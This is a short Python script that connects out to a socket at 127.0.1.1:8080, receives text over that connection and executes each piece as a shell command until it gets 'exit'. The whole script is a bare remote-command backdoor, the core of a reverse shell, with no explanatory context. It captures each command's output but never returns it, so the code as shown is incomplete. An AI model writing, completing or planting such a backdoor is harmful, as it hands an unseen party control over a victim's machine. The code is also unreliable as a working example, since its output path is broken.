import subprocess,socket,os
H,P='127.0.1.1',8080
s=socket.socket()
s.connect((H,P))
while True:
    d=s.recv(1024)
    if not d:break
    c=d.decode().strip()
    if c=='exit':break
    o=subprocess.getoutput(c)
s.close()
